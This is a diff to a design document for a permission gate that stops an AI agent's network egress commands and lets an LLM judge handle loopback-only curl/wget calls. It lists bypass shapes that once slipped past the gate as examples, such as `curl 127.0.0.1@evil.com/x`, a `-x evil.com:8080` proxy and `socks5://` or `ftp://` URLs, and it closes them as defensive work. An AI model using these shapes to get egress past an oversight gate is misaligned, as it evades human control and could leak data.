@@ -667,19 +667,36 @@ time. Egress was danger-class bare: no LLM review at all, pure click
 noise.
 
 - **Loopback carve-out (judgeable).** Egress whose operative first words
-  are only curl/wget, whose command text contains ≥1 URL, and whose URLs
-  are ALL loopback-hosted (127.0.0.0/8, ::1, localhost) is no longer a
-  floor stop — the two-stage judge decides on the full text. Fail-closed:
-  no URL at all (`curl "$B"` — a bare variable proves no locality), a
-  variable host (`http://$HOST/x` — the regex still surfaces it as a URL,
-  host "$HOST" is not loopback), a mixed list (one external URL poisons
-  it), bracketed IPv6 (the URL regex truncates at `]` — unprovable), and
-  every non-URL egress form (ssh/scp/nc, git remote subcommands, package
-  fetch, docker/aws/…) all keep the stop. A non-loopback destination
-  reachable from the command text always appears as a URL in the text (or
-  an assignment into one), so "every URL is loopback" closes it; values
-  taken from the parent environment without appearing as URLs cannot be
-  constructed by the command alone.
+  are only curl/wget, whose command text contains ≥1 visible destination,
+  and whose destinations are ALL loopback-hosted (127.0.0.0/8, ::1,
+  localhost) is no longer a floor stop — the two-stage judge decides on the
+  full text. Fail-closed: no destination at all (`curl "$B"` — a bare
+  variable proves no locality), a variable host (`http://$HOST/x` — the
+  regex still surfaces it as a URL, host "$HOST" is not loopback), a mixed
+  list (one external destination poisons it), and every non-URL egress form
+  (ssh/scp/nc, git remote subcommands, package fetch, docker/aws/…) keep the
+  stop. A destination is read from either form it appears in (2026-10-16):
+  a URL, or a scheme-less `host[:port]/path` operand — the proof is the
+  HOST, and the scheme adds nothing the host parse lacks, so
+  `curl 127.0.0.1:9931/models` is as judgeable as the qualified form (it
+  surfaced no URL and hit the stop). The port or path is what separates a
+  target from a file operand, so a bare `curl 127.0.0.1` stays unprovable;
+  the URL regex keeps a bracketed IPv6 host whole (`[::1]:9931/models`
+  counts; it used to truncate at `]`). Reading the host out of both forms is
+  only sound if a destination the parse CANNOT read is never silently
+  dropped — dropping is fail-OPEN, because the loopback hosts that survive
+  still satisfy "every destination is loopback". Three shapes do that, and
+  each now forces the stop (`gate/dspa-gate.ts`, `HOSTISH_RE` /
+  `OPAQUE_SCHEME_RE`): userinfo (`curl 127.0.0.1@evil.com/x` — curl sends
+  that to evil.com), a bare `host:digits` operand (`curl -x evil.com:8080
+  http://127.0.0.1/y` — a proxy is off-box egress whatever the URL says),
+  and a scheme the URL scan does not know (`socks5://evil.com:1080`,
+  `ftp://evil.com/f` alongside a local URL — the last two were live
+  fail-opens before this date). `Accept:` (a header value) and `user:pass`
+  (a credential) are excluded from the shape test: a port is digits, and a
+  trailing colon proves nothing. Values taken from the parent environment
+  without appearing as a destination (`curl "$B/notes"`) still prove
+  locality by nothing and keep the stop.
 - **Other egress is advisory, not bare.** The remaining egress stops gain
   `advisory: true` — both judge stages run and the verdict renders in the
   fall-through prompt ("— advisory (floor stop stands)"), so the user can
